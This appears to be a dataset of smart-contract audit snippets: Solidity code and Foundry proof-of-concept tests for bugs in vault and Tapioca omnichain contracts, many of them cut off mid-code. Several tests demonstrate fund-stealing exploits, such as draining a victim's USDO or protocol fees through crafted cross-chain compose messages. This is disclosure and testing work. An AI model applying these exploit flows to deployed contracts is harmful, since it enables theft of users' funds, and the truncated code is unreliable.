vm.prank(owner);\n    vault.close();\n\n    vm.prank(alice);\n    vault.requestDeposit(500e18, alice, alice, """");\n\n    assertEq(vault.pendingDepositRequest(alice), 500e18);\n\n    vm.prank(bob);\n    vault.claimAndRequestDeposit(0, alice, """");\n\n    assertEq(vault.pendingDepositRequest(alice), 0);\n}\n```"
"```\nfunction test_poc() external {\n    // set token balances\n    deal(vaultTested.asset(), user1.addr, 20); // owner\n\n    vm.startPrank(user1.addr);\n    IERC20Metadata(vaultTested.asset()).approve(address(vaultTested), 20);\n\n    // owner deposits tokens when vault is open and receives vault shares\n    vaultTested.deposit(20, user1.addr);\n\n    // owner delegates shares balance to user\n    IERC20Metadata(address(vaultTested)).approve(user2.addr, vaultTested.balanceOf(user1.addr));\n    vm.stopPrank();\n\n    // vault is closed\n    vm.prank(vaultTested.owner());\n    vaultTested.close();\n\n    // epoch = 1\n    vm.startPrank(user2.addr);\n    // user requests a redeem on behalf of owner\n    vaultTested.requestRedeem(vaultTested.balanceOf(user1.addr), user2.addr, user1.addr, """");\n    // user checks the pending redeem request amount\n    assertEq(vaultTested.pendingRedeemRequest(user2.addr), 20);\n    vm.stopPrank();\n\n    vm.startPrank(vaultTested.owner());\n    IERC20Metadata(vaultTested.asset()).approve(address(vaultTested), type(uint256).max);\n    vaultTested.settle(23); // an epoch goes by\n    vm.stopPrank();\n\n    // epoch = 2\n\n    vm.startPrank(user2.addr);\n    // user tries to claim the redeem\n    vaultTested.claimRedeem(user2.addr);\n    assertEq(IERC20Metadata(vaultTested.asset()).balanceOf(user2.addr), 0);\n    // however, token balance of user is still empty\n    vm.stopPrank();\n\n    vm.startPrank(user1.addr);\n    // owner also tries to claim the redeem\n    vaultTested.claimRedeem(user1.addr);\n    assertEq(IERC20Metadata(vaultTested.asset()).balanceOf(user1.addr), 0);\n    // however, token balance of owner is still empty\n    vm.stopPrank();\n\n    // all the balances of owner and user are zero, indicating loss of funds\n    assertEq(vaultTested.balanceOf(user1.addr), 0);\n    assertEq(IERC20Metadata(vaultTested.asset()).balanceOf(user1.addr), 0);\n    assertEq(vaultTested.balanceOf(user2.addr"
"```\nuint256 totalAssetsSnapshotForDeposit = _lastSavedBalance + 1;\nuint256 totalSupplySnapshotForDeposit = totalSupply + 1;\n\nuint256 totalAssetsSnapshotForRedeem = _lastSavedBalance + pendingDeposit + 1;\nuint256 totalSupplySnapshotForRedeem = totalSupply + sharesToMint + 1;\n```\n```\nimport { IERC20 } from ""@openzeppelin/contracts/token/ERC20/IERC20.sol"";\n```\nfunction test_attackerProfitsViaRequestingDeposits() external {\n    address attacker = makeAddr(""attacker"");\n    address protocolUsers = makeAddr(""alice"");\n    address vaultOwner = vaultTested.owner();\n\n    uint256 donation = 1e18 - 1;\n    uint256 protocolUsersDeposit = 10e18 + 15e18;\n    uint256 protocolTeamBootstrapDeposit = 1e18;\n\n    IERC20 asset = IERC20(vaultTested.asset());\n    deal(address(asset), protocolUsers, protocolUsersDeposit);\n    deal(address(asset), attacker, donation);\n    deal(address(asset), vaultOwner, protocolTeamBootstrapDeposit);\n\n    vm.prank(vaultOwner);\n    asset.approve(address(vaultTested), type(uint256).max);\n\n    vm.prank(protocolUsers);\n    asset.approve(address(vaultTested), type(uint256).max);\n\n    vm.prank(attacker);\n    asset.approve(address(vaultTested), type(uint256).max);\n\n    vm.prank(attacker);\n    asset.transfer(address(vaultTested), donation);\n\n    vm.prank(vaultOwner);\n    vaultTested.deposit(protocolTeamBootstrapDeposit, vaultOwner);\n\n    vm.prank(protocolUsers);\n    vaultTested.deposit(10e18, protocolUsers);\n\n    vm.prank(vaultOwner);\n    vaultTested.close();\n\n    vm.prank(protocolUsers);\n    vaultTested.requestDeposit(15e18, protocolUsers, protocolUsers, """");\n\n    uint256 totalSupplyCachedOnOpen = vaultTested.totalSupply() + 1 + 1;\n    uint256 totalAssetsCachedOnOpen = vaultTested.lastSavedBalance() + 1 + 1;\n    uint256 minToDepositToGetOneShare = totalAssetsCachedOnOpen / totalSupplyCachedOnOpen;\n\n    uint256 totalDeposited = 0;\n    for (uint256 i = 0; i < 30; i++) {\n        address attackerEOA = address(uint160(i * 31000 + 49 * 49)); // Random address that does not conflict with existing ones\n        deal(address(asset), attackerEOA, minToDepositToGetOneShare);\n        vm.startPrank(attackerEOA);\n        asset.approve(address(vaultTested), type(uint256).max);\n        vaultTested.requestDeposit(minToDepositToGetOneShare, attackerEOA, attackerEOA, """");\n        vm.stopPrank();\n        totalDepos"
"```\nfunction _transferTokenInAndApprove(\n    address router,\n    IERC20 tokenIn,\n    uint256 amount\n) internal {\n    tokenIn.safeTransferFrom(_msgSender(), address(this), amount);\n    if (tokenIn.allowance(address(this), router) < amount) {\n        tokenIn.forceApprove(router, amount);\n    }\n}\n```\n```\ndiff --git a/asynchronous-vault/test/Zapper/ZapperDeposit.t.sol b/asynchronous-vault/test/Zapper/ZapperDeposit.t.sol\nindex 9083127..ff11b56 100644\n--- a/asynchronous-vault/test/Zapper/ZapperDeposit.t.sol\nb/asynchronous-vault/test/Zapper/ZapperDeposit.t.sol\n@@ -17,6 +17,25 @@\ncontract VaultZapperDeposit is OffChainCalls {\n    function test_zapIn() public {\n        Swap memory params = \n            Swap(_router, _USDC, _WSTETH, 1500 * 1e6, 1, address(0), 20);\n        _setUpVaultAndZapper(_WSTETH);\n        IERC4626 vault = _vault;\n        bytes memory swapData = \n            _getSwapData(address(zapper), address(zapper), params);\n        _getTokenIn(params);\n        // If the msgSender() happend to approve the SwapRouter before, then the zap will always revert\n        IERC20(params.tokenIn).approve(address(params.router), params.amount);\n        zapper.zapAndDeposit(\n            params.tokenIn, vault, params.router, params.amount, swapData\n        );\n    }\n\n    function test_zapAndDepositUsdcWSTETH() public {\n        Swap memory usdcToWstEth = \n```\n```\nRan 1 test for test/Zapper/ZapperDeposit.t.sol:VaultZapperDeposit\n[FAIL. Reason: SwapFailed(""\u{8}y\u{0}\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(ERC20: transfer amount exceeds allowance\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"")] test_zapIn() (gas: 4948462)\n\nSuite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 20.84s (18.74s CPU time)\n\nRan 1 test suite in 22.40s (20.84s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)\n\nFailing tests:\nEncountered 1 failing test in test/Zapper/ZapperDeposit.t.sol:VaultZapperDeposit\n[FAIL. Reason: SwapFailed(""\u{8}y\u{0}\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(ERC20: transfer amount exceeds allowance\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\"
"```\nfunction _liquidateUser(\n    address user,\n    uint256 maxBorrowPart,\n    IMarketLiquidatorReceiver _liquidatorReceiver,\n    bytes calldata _liquidatorReceiverData,\n    uint256 _exchangeRate,\n    uint256 minLiquidationBonus\n) private {\n    uint256 callerReward = _getCallerReward(user, _exchangeRate);\n\n    (uint256 borrowAmount, uint256, uint256 collateralShare) = _updateBorrowAndCollateralShare(\n        user,\n        maxBorrowPart,\n        minLiquidationBonus,\n        _exchangeRate\n    );\n\n    totalCollateralShare = totalCollateralShare > collateralShare? totalCollateralShare - collateralShare : 0;\n    uint256 borrowShare = yieldBox.toShare(assetId, borrowAmount, true);\n\n    (uint256 feeShare, uint256 callerShare) = _extractLiquidationFees(borrowShare, borrowShare, callerReward);\n\n    IUsdo(address(asset)).burn(address(this), borrowAmount);\n\n    address[] memory _users = new address[](1);\n    _users[0] = user;\n    emit Liquidated(msg.sender, _users, callerShare, feeShare, borrowAmount, collateralShare);\n}\n\nfunction _updateBorrowAndCollateralShare(\n    address user,\n    uint256 maxBorrowPart,\n    uint256 minLiquidationBonus, // min liquidation bonus to accept (default 0)\n    uint256 _exchangeRate\n) private returns (uint256 borrowAmount, uint256 borrowPart, uint256 collateralShare) {\n    if (_exchangeRate == 0) revert ExchangeRateNotValid();\n\n    uint256 collateralPartInAsset = (\n        yieldBox.toAmount(collateralId, userCollateralShare[user], false) * EXCHANGE_RATE_PRECISION\n    ) / _exchangeRate;\n\n    uint256 borrowPartWithBonus = computeClosingFactor(\n        userBorrowPart[user],\n        collateralPartInAsset,\n        FEE_PRECISION_DECIMALS\n    );\n\n    uint256 userTotalBorrowAmount = totalBorrow.toElastic(userBorrowPart[user], true);\n    borrowPartWithBonus = borrowPartWithBonus > userTotalBorrowAmount? userTotalBorrowAmount : borrowPartWithBonus;\n\n    borrowPartWithBonus = borrowPartWithBonus > maxBorrowPart? maxBorrowPart : borrowPartWithBonus;\n    borrowAmount = borrowPartWithBonus;\n\n    borrowPart = borrowAmount == userTotalBorrowAmount\n       ? user"
```\nuint256 liquidationStartsAt = \n    (collateralPartInAsset * _liquidationCollateralizationRate) / (10 ** ratesPrecision);\n\nif (borrowPart < liquidationStartsAt) return 0;\n\nuint256 numerator = borrowPart - liquidationStartsAt;\n\nuint256 diff = \n    (collateralizationRate * ((10 ** ratesPrecision) + _liquidationMultiplier)) / (10 ** ratesPrecision);\nint256 denominator = ((10 ** ratesPrecision) - int256(diff)) * int256(1e13);\n\nint256 x = (int256(numerator) * int256(1e18)) / denominator;\n```
"```\nif (address(this).balance < _amount) {\n    revert ExceedsBalance();\n}\n\nuint256 valueAmount = msg.value + _amount;\nrouterETH.swapETH{value: valueAmount}(\n    _dstChainId,\n    payable(this),\n    abi.encodePacked(connectedOFTs[_oft][_dstChainId].dstOft),\n    _amount,\n    _computeMinAmount(_amount, _slippage)\n);\n```\npragma solidity ^0.8.0;\n\ncontract mTOFT {\n    address private _stargateRouter;\n\n    function sgReceive(\n        uint16,\n        bytes memory,\n        uint256,\n        address,\n        uint256 amountLD,\n        bytes memory\n    ) external payable {\n        if (msg.sender!= _stargateRouter) {\n            revert mTOFT_NotAuthorized();\n        }\n\n        if (erc20 == address(0)) {\n            vault.depositNative{value: amountLD}();\n        } else {\n            IERC20(erc20).safeTransfer(address(vault), amountLD);\n        }\n    }\n}\n```\nfunction swapETH(\n    uint16 _dstChainId, \n    address payable _refundAddress, \n    bytes calldata _toAddress, \n    uint256 _amountLD, \n    uint256 _minAmountLD\n) external payable {\n    require(msg.value > _amountLD, ""Stargate: msg.value must be > _amountLD"");\n\n    IStargateEthVault(stargateEthVault).deposit{value: _amountLD}();\n    IStargateEthVault(stargateEthVault).approve(address(stargateRouter), _amountLD);\n\n    uint256 messageFee = msg.value - _amountLD;\n\n    stargateRouter.swap{value: messageFee}(\n        _dstChainId, \n        poolId, \n        poolId, \n        _refundAddress, \n        _amountLD, \n        _minAmountLD, \n        IStargateRouter.lzTxObj(0, 0, ""0x""), \n        _toAddress, \n        bytes("""")\n    );\n}\n```\n```\nfunction lzReceive(\n    uint16 _srcChainId,\n    bytes memory _srcAddress,\n    uint64 _nonce,\n    bytes memory _payload\n) external override {\n    if (functionType == TYPE_SWAP_REMOTE) {\n        (\n            uint8,\n            uint256 srcPoolId,\n            uint256 dstPoolId,\n            uint256 dstGasForCall,\n            Pool.CreditObj memory c,\n            Pool.SwapObj memory s,\n            bytes memory to,\n            bytes memory payload\n        ) = abi.decode(_payload, (uint8, uint256, uint256, uint256, Pool.CreditObj, Pool.SwapObj, bytes, bytes));\n        address toAddress;\n        assembly {\n            toAddress := mload(add(to, 20))\n        }\n        router.creditChainPath(_srcChainId, srcPoolId, dstPoolId, c);\n        router.swapRemote(_srcChainId, _srcAddress, _nonce, srcPoolId, dstPoolId, dstGasForCall, toAddress, s, payload);\n    }\n```\n```\nfunction _swapRemote(\n    uint16 _srcChainId,\n    bytes memory _srcAddress,\n    uint256 _nonce,\n    uint256 _srcPoolId,\n    uint256 _dstPoolId,\n    uint256 _dstGasForCall,\n    address _to,\n    Pool.SwapObj memory _s,\n    bytes memory _payload\n) internal {\n    Pool pool = _getPool(_dstPoolId);\n\n    try pool.swapRemote(_srcChainId, _srcPoolId, _to, _s) returns (uint256 amountLD) {\n        if (_payload.length > 0) {\n            try IStargateReceiver(_to).sgReceive{gas: _dstGasForCall}(_srcChainId, _srcAddress, _nonce, pool.token(), amountLD, _payload) {\n                // do nothing\n            } catch (bytes memory reason) {\n                cachedSwapLookup[_srcChainId][_srcAddress][_nonce] = CachedSwap(pool.token(), amountLD, _to, _payload);\n                emit CachedSwapSaved(_srcChainId, _srcAddress, _nonce, pool.token(), amountLD, _to, _payload, reason);\n            }\n        }\n    } catch {\n        revertLookup[_srcChainId][_srcAddress][_nonce] = abi.encode(\n            TYPE_SWAP_REMOTE_RETRY,\n            _srcPoolId,\n            _dstPoolId,\n            _dstGasForCall,\n            _to,\n            _s,\n            _payload\n        );\n        emit Revert(TYPE_SWAP_REMOTE_RETRY, _srcChainId, _srcAddress, _nonce);\n    }\n}\n```\n```\n## TapiocaOmnichainSender.sol\n\nfunction sendPacket(LZSendParam calldata _lzSendParam, bytes calldata _composeMsg)\n    external\n    payable\n    returns (MessagingReceipt memory msgReceipt, OFTReceipt memory oftReceipt)\n{\n    (uint256 amountDebitedLD, uint256 amountToCreditLD) =\n        _debit(_lzSendParam.sendParam.amountLD, _lzSendParam.sendParam.minAmountLD, _lzSendParam.sendParam.dstEid);\n\n    (bytes memory message, bytes memory options) =\n        _buildOFTMsgAndOptions(_lzSendParam.sendParam, _lzSendParam.extraOptions, _composeMsg, amountToCreditLD);\n\n    msgReceipt = _lzSend(_lzSendParam.sendParam.dstEid, message, options, _lzSendParam.fee, _lzSendParam.refundAddress);\n\n    oftReceipt = OFTReceipt(amountDebitedLD, amountToCreditLD);\n\n    emit OFTSent(msgReceipt.guid, _lzSendParam.sendParam.dstEid, msg.sender, amountDebitedLD);\n}\n```"
"```\nfunction exerciseOptionsReceiver(address srcChainSender, bytes memory _data) public payable {\n    ITapiocaOptionBroker(_options.target).exerciseOption(\n        _options.oTAPTokenID,\n        address(this), // payment token\n        _options.tapAmount\n    );\n    _approve(address(this), address(pearlmit), 0);\n    uint256 bAfter = balanceOf(address(this));\n\n    if (bBefore > bAfter) {\n        uint256 diff = bBefore - bAfter;\n        if (diff < _options.paymentTokenAmount) {\n            IERC20(address(this)).safeTransfer(_options.from, _options.paymentTokenAmount - diff);\n        }\n    }\n}"
"```\nfunction lzCompose(\n    address _from,\n    bytes32 _guid,\n    bytes calldata _message,\n    address, // executor\n    bytes calldata // extra Data\n) external payable override {\n    // Decode LZ compose message.\n    (address srcChainSender_, bytes memory oftComposeMsg_) =\n        TapiocaOmnichainEngineCodec.decodeLzComposeMsg(_message);\n\n    // Execute the composed message.\n    _lzCompose(srcChainSender_, _guid, oftComposeMsg_);\n}\n```\n```\nfunction _lzCompose(address srcChainSender_, bytes32 _guid, bytes memory oftComposeMsg_) internal {\n    // Decode OFT compose message.\n    (uint16 msgType_,,, bytes memory tapComposeMsg_, bytes memory nextMsg_) =\n        TapiocaOmnichainEngineCodec.decodeToeComposeMsg(oftComposeMsg_);\n\n    // Call Permits/approvals if the msg type is a permit/approval.\n    // If the msg type is not a permit/approval, it will call the other receivers.\n    if (msgType_ == MSG_REMOTE_TRANSFER) {\n        _remoteTransferReceiver(srcChainSender_, tapComposeMsg_);\n    }\n}\n```\n```\nfunction _remoteTransferReceiver(address _srcChainSender, bytes memory _data) internal virtual {\n    RemoteTransferMsg memory remoteTransferMsg_ = TapiocaOmnichainEngineCodec.decodeRemoteTransferMsg(_data);\n\n    _internalTransferWithAllowance(\n        remoteTransferMsg_.owner, _srcChainSender, remoteTransferMsg_.lzSendParam.sendParam.amountLD\n    );\n\n    // Make the internal transfer, burn the tokens from this contract and send them to the recipient on the other chain.\n    _internalRemoteTransferSendPacket(\n        remoteTransferMsg_.owner,\n        remoteTransferMsg_.lzSendParam,\n        remoteTransferMsg_.composeMsg\n    );\n}\n```\n```\nfunction _internalRemoteTransferSendPacket(\n    address _srcChainSender,\n    LZSendParam memory _lzSendParam,\n    bytes memory _composeMsg\n) internal returns (MessagingReceipt memory msgReceipt, OFTReceipt memory oftReceipt) {\n    // Burn tokens from this contract\n    (uint256 amountDebitedLD_, uint256 amountToCreditLD_) = _debitView(\n        _lzSendParam.sendParam.amountLD,\n        _lzSendParam.sendParam.minAmountLD,\n        _lzSendParam.sendParam.dstEid\n    );\n    _burn(address(this), amountToCreditLD_);\n\n    (bytes memory message, bytes memory options) = _buildOFTMsgAndOptionsMemory(\n        _lzSendParam.sendParam,\n        _lzSendParam.extraOptions,\n        _composeMsg,\n        amountToCreditLD_,\n        _srcChainSender\n    );\n\n    msgReceipt = _lzSend(\n        _lzSendParam.sendParam.dstEid,\n        message,\n        options,\n        _lzSendParam.fee,\n        _lzSendParam.refundAddress\n    );\n}\n```\n```\nfunction _remoteTransferReceiver(address _srcChainSender, bytes memory _data) internal virtual {\n    // Make the internal transfer, burn the tokens from this contract and send them to the recipient on the other chain.\n    _internalRemoteTransferSendPacket(\n        _srcChainSender,  // This parameter will become the _srcChainSender in the recursive compose message call\n        remoteTransferMsg_.lzSendParam, \n        remoteTransferMsg_.composeMsg \n    );\n}\n```\n```\npragma solidity ^0.8.20;\n\nstruct MessagingReceipt {\n    bytes32 guid;\n    uint64 nonce;\n    MessagingFee fee;\n}\n\nstruct MessagingParams {\n    uint32 dstEid;\n    bytes32 receiver;\n    bytes memory message;\n    bytes memory options;\n    bool payInLzToken;\n}\n\nstruct MessagingFee {\n    uint256 nativeFee;\n    uint256 lzTokenFee;\n}\n\ncontract MockEndpointV2 {\n    function send(\n        MessagingParams calldata _params,\n        address _refundAddress\n    ) external payable returns (MessagingReceipt memory receipt) {\n        // DO NOTHING\n    }\n\n    function sendCompose(address _to, bytes32 _guid, uint16 _index, bytes calldata _message) external {\n        // DO NOTHING\n    }\n}\n```\n```\nfunction testVuln_stealUSDOFromATargetUserDueToWrongParameter() public {\n    // Change configured enpoints\n    endpoints[aEid] = address(mockEndpointV2A);\n    endpoints[bEid] = address(mockEndpointV2B);\n\n    aUsdo.setEndpoint(address(mockEndpointV2A));\n    bUsdo.setEndpoint(address(mockEndpointV2B));\n\n    deal(address(aUsdo), makeAddr(""victim""), 100 ether);\n\n    // FINAL MESSAGE    A ---> B\n    SendParam memory sendParamAToBVictim = SendParam({\n        dstEid: bEid,\n        to: OFTMsgCodec.addressToBytes32(makeAddr(""attacker"")),\n        amountLD: 100 ether, // IMPORTANT: This must be set to the amount we want to steal\n        minAmountLD: 100 ether,\n        extraOptions: bytes(""""),\n        composeMsg: bytes(""""),\n        oftCmd: bytes("""")\n    });\n\n    MessagingFee memory feeAToBVictim = MessagingFee({\n        nativeFee: 0,\n        lzTokenFee: 0\n    });\n\n    LZSendParam memory lzSendParamAToBVictim = LZSendParam({\n        sendParam: sendParamAToBVictim,\n        fee: feeAToBVictim,\n        extraOptions: bytes(""""),\n        refundAddress: makeAddr(""attacker"")\n    });\n\n    RemoteTransferMsg memory remoteTransferMsgVictim = RemoteTransferMsg({\n        owner: makeAddr(""victim""), // IMPORTANT: This will make the attack be triggered as the victim will become the srcChainSender in the destination chain\n        composeMsg: bytes(""""),\n        lzSendParam: lzSendParamAToBVictim\n    });\n\n    uint16 index; // needed to bypass Solidity's encoding literal error\n    // Create Toe Compose message for the victim\n    bytes memory toeComposeMsgVictim = abi.encodePacked(\n        PT_REMOTE_TRANSFER, // msgType\n        uint16(abi.encode(remoteTransferMsgVictim).length), // message length (0)\n        index, // index\n        abi.encode(remoteTransferMsgVictim), // message\n        bytes("""") // next message\n    );\n\n    // SECOND MESSAGE     B ---> A\n    SendParam memory sendParamBToA = SendParam({\n        dstEid: aEid,\n        to: OFTMsgCodec.addressToBytes32(makeAddr(""attacker"")),\n        amountLD: 0"
"```\nfunction flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)\n    external\n    override\n    returns (bool)\n{\n    IERC20(address(usdo)).safeTransferFrom(address(receiver), address(usdo), fee);\n    _flashloanEntered = false;\n    return true;\n}\n```\n```\nfunction extractFees() external onlyOwner {\n    if (_fees > 0) {\n        uint256 balance = balanceOf(address(this));\n        uint256 toExtract = balance >= _fees? _fees : balance;\n        _fees -= toExtract;\n        _transfer(address(this), msg.sender, toExtract);\n    }\n}\n```\n```\npragma solidity ^0.8.0;\n\ncontract TapiocaOmnichainReceiver {\n    function _lzCompose(address srcChainSender_, bytes32 _guid, bytes memory oftComposeMsg_) internal {\n        // Decode OFT compose message.\n        (uint16 msgType_,,, bytes memory tapComposeMsg_, bytes memory nextMsg_) = \n            TapiocaOmnichainEngineCodec.decodeToeComposeMsg(oftComposeMsg_);\n\n        // Call Permits/approvals if the msg type is a permit/approval.\n        // If the msg type is not a permit/approval, it will call the other receivers. \n        if (msgType_ == MSG_REMOTE_TRANSFER) {   \n            _remoteTransferReceiver(srcChainSender_, tapComposeMsg_);   \n        } else if (!_extExec(msgType_, tapComposeMsg_)) { \n            // Check if the TOE extender is set and the msg type is valid. If so, call the TOE extender to handle msg.\n            if (address(tapiocaOmnichainReceiveExtender)!= address(0) \n                && tapiocaOmnichainReceiveExtender.isMsgTypeValid(msgType_)\n            ) {  \n                bytes memory callData = abi.encodeWithSelector(\n                    ITapiocaOmnichainReceiveExtender.toeComposeReceiver.selector,\n                    msgType_,\n                    srcChainSender_, \n                    tapComposeMsg_\n                ); \n                (bool success, bytes memory returnData) = \n                    address(tapiocaOmnichainReceiveExtender).delegatecall(callData);\n                if (!success) {\n                    revert(_getTOEExtenderRevertMsg(returnData));\n                }\n            } else {\n                // If no TOE extender is set or msg type doesn't match extender, try to call the internal receiver.\n                if (!_toeComposeReceiver(msgType_, srcChainSender_, tapComposeMsg_)) {\n                    revert InvalidMsgType(msgType_);\n                }\n            }\n        }\n        emit ComposeReceived(msgType_, _guid, tapComposeMsg_);\n        if (nextMsg_.length > 0) {\n            _lzCompose(address(this), _guid, nextMsg_);\n        }\n    }\n}\n```\n```\n// USDO.sol\nfunction _remoteTransferReceiver(address _srcChainSender, bytes memory _data) internal virtual {\n    RemoteTransferMsg memory remoteTransferMsg_ = TapiocaOmnichainEngineCodec.decodeRemoteTransferMsg(_data);\n\n    // @dev xChain owner needs to have approved dst srcChain `sendPacket()` msg.sender in a previous composedMsg. Or be the same address.\n    _internalTransferWithAllowance(\n        remoteTransferMsg_.owner, _srcChainSender, remoteTransferMsg_.lzSendParam.sendParam.amountLD\n    );\n\n    // rest of code\n}\n\nfunction _internalTransferWithAllowance(address _owner, address srcChainSender, uint256 _amount) internal {\n    if (_owner!= srcChainSender) {\n        _spendAllowance(_owner, srcChainSender, _amount);\n    }\n\n    _transfer(_owner, address(this), _amount);\n}\n```\n```\npragma solidity ^0.8.20;\n\nstruct MessagingReceipt {\n    bytes32 guid;\n    uint64 nonce;\n    MessagingFee fee;\n}\n\nstruct MessagingParams {\n    uint32 dstEid;\n    bytes32 receiver;\n    bytes memory message;\n    bytes memory options;\n    bool payInLzToken;\n}\n\nstruct MessagingFee {\n    uint256 nativeFee;\n    uint256 lzTokenFee;\n}\n\ncontract MockEndpointV2 {\n    function send(\n        MessagingParams calldata _params,\n        address _refundAddress\n    ) external payable returns (MessagingReceipt memory receipt) {\n        // DO NOTHING\n    }\n\n    function sendCompose(address _to, bytes32 _guid, uint16 _index, bytes calldata _message) external {\n        // DO NOTHING\n    }\n}\n```\n```\nfunction testVuln_USDOBorrowFeesCanBeDrained() public {\n    // Change configured endpoints\n    endpoints[aEid] = address(mockEndpointV2A);\n    endpoints[bEid] = address(mockEndpointV2B);\n\n    aUsdo.setEndpoint(address(mockEndpointV2A));\n    bUsdo.setEndpoint(address(mockEndpointV2B));\n\n    // Mock generated fees\n    deal(address(bUsdo), address(bUsdo), 100 ether);\n\n    ////////////////////////////////////////////////////////\n    //                 PREPARE MESSAGES                   //\n    ////////////////////////////////////////////////////////\n\n    // NEXT MESSAGE    B --> A      (EXECUTED AS THE nextMsg after the INITIAL  B --> A MESSAGE)            \n\n    SendParam memory sendParamAToBVictim = SendParam({\n        dstEid: aEid,\n        to: OFTMsgCodec.addressToBytes32(makeAddr(""attacker"")),\n        amountLD: 100 ether, // IMPORTANT: This must be set to the amount we want to steal\n        minAmountLD: 100 ether,\n        extraOptions: bytes(""""),\n        composeMsg: bytes(""""),\n        oftCmd: bytes("""")\n    });  \n    MessagingFee memory feeAToBVictim = MessagingFee({\n        nativeFee: 0,\n        lzTokenFee: 0\n    });\n    \n    LZSendParam memory lzSendParamAToBVictim = LZSendParam({\n        sendParam: sendParamAToBVictim,\n        fee: feeAToBVictim,\n        extraOptions: bytes(""""),\n        refundAddress: makeAddr(""attacker"")\n    });\n\n    RemoteTransferMsg memory remoteTransferMsgVictim = RemoteTransferMsg({\n        owner: address(bUsdo), // IMPORTANT: This will make the attack be triggered as bUsdo will become the srcChainSender in the nextMsg compose call\n        composeMsg: bytes(""""),\n        lzSendParam: lzSendParamAToBVictim\n    });\n\n    uint16 index; // needed to bypass Solidity's encoding literal error\n    // Create Toe Compose message for the victim\n    bytes memory toeComposeMsgVictim = abi.encodePacked(\n        PT_REMOTE_TRANSFER, // msgType\n        uint16(abi.encode(remoteTransferMsgVictim).length), // message length (0)\n        index, // index\n        abi.encode(remoteTransferMsgVictim), // message\n        bytes("""") // next message\n    );\n\n    // SECOND MESSAGE (composed)     B ---> A"
"```\nbUsdo.executeModule(\n    IUsdo.Module.UsdoMarketReceiver,\n    abi.encodeWithSelector(\n        UsdoMarketReceiverModule.removeAssetReceiver.selector,\n        marketMsg_\n    ),\n    false\n)\n```\nMarketRemoveAssetMsg({\n    user: address(userB), // victim\n    externalData: ICommonExternalContracts({\n        magnetar: address(magnetar),\n        singularity: address(singularity),\n        bigBang: address(0),\n        marketHelper: address(marketHelper)\n    }),\n    removeAndRepayData: IRemoveAndRepay({\n        removeAssetFromSGL: true, // remove from Singularity market\n        removeAmount: tokenAmountSD,\n        repayAssetOnBB: false,\n        repayAmount: 0,\n        removeCollateralFromBB: false,\n        collateralAmount: 0,\n        exitData: IOptionsExitData({\n            exit: false,\n            target: address(0),\n            oTAPTokenID: 0\n        }),\n        unlockData: IOptionsUnlockData({\n            unlock: false,\n            target: address(0),\n            tokenId: 0\n        }),\n        assetWithdrawData: MagnetarWithdrawData({\n            withdraw: true, // withdraw assets\n            yieldBox: address(yieldBox), // where from to withdraw\n            assetId: bUsdoYieldBoxId, // what asset to withdraw\n            unwrap: false,\n            lzSendParams: LZSendParam({\n                refundAddress: address(userB),\n                fee: MessagingFee({\n                    lzTokenFee: 0,\n                    nativeFee: 0\n                }),\n                extraOptions: ""0x"",\n                sendParam: SendParam({\n                    amountLD: 0,\n                    composeMsg: ""0x"",\n                    dstEid: 0,\n                    extraOptions: ""0x"",\n                    minAmountLD: 0,\n                    oftCmd: ""0x"",\n                    to: OFTMsgCodec.addressToBytes32(address(userA)) // recipient of the assets\n                })\n            }),\n            sendGas: 0,\n            composeGas: 0,\n            sendVal: 0,\n            composeVal: 0,\n            composeMsg: ""0x"",\n            composeMsgType: 0\n        }),\n        collateralWithdrawData: MagnetarWithdrawData({\n            withdraw: false,\n            yieldBox: address(0),\n            assetId: 0,\n            unwrap: false,\n            lzSendParams: LZSendParam({\n                refundAddress: address(userB),\n                fee: MessagingFee({\n                    lzTokenFee: 0,\n                    nativeFee: 0\n                }),\n                extraOptions: ""0x"",\n                sendParam: SendParam({\n```\nfunction test_malicious_market_remove_asset() public {\n    uint256 erc20Amount_ = 1 ether;\n\n    // setup\n    {\n        deal(address(bUsdo), address(userB), erc20Amount_);\n        vm.startPrank(userB);\n        bUsdo.approve(address(yieldBox), type(uint256).max);\n        yieldBox.depositAsset(bUsdoYieldBoxId, address(userB), address(userB), erc20Amount_, 0);\n\n        uint256 sh = yieldBox.toShare(bUsdoYieldBoxId, erc20Amount_, false);\n        yieldBox.setApprovalForAll(address(pearlmit), true);\n        pearlmit.approve(\n            address(yieldBox), bUsdoYieldBoxId, address(singularity), uint200(sh), uint48(block.timestamp + 1)\n        );\n        singularity.addAsset(address(userB), address(userB), false, sh);\n        vm.stopPrank();\n    }\n\n    uint256 tokenAmount_ = 0.5 ether;\n\n    // Actions\n    uint256 tokenAmountSD = usdoHelper.toSD(tokenAmount_, aUsdo.decimalConversionRate());\n\n    // Approve magnetar\n    vm.startPrank(userB);\n    bUsdo.approve(address(magnetar), type(uint256).max);\n    singularity.approve(address(magnetar), type(uint256).max);\n    vm.stopPrank();\n\n    MarketRemoveAssetMsg memory marketMsg = MarketRemoveAssetMsg({\n        user: address(userB),\n        externalData: ICommonExternalContracts({\n            magnetar: address(magnetar),\n            singularity: address(singularity),\n            bigBang: address(0),\n            marketHelper: address(marketHelper)\n        }),\n        removeAndRepayData: IRemoveAndRepay({\n            removeAssetFromSGL: true,\n            removeAmount: tokenAmountSD,\n            repayAssetOnBB: false,\n            repayAmount: 0,\n            removeCollateralFromBB: false,\n            collateralAmount: 0,\n            exitData: IOptionsExitData({exit: false, target: address(0), oTAPTokenID: 0}),\n            unlockData: IOptionsUnlockData({unlock: false, target: address(0), tokenId: 0}),\n            assetWithdrawData: MagnetarWithdrawData({\n                withdraw: true,\n                yieldBox: address(yieldBox),\n                assetId: bUsdoYieldBox"
"```\nfunction approveBorrow(address spender, uint256 amount) external returns (bool) {\n    _approveBorrow(msg.sender, spender, amount);\n    return true;\n}\n```"
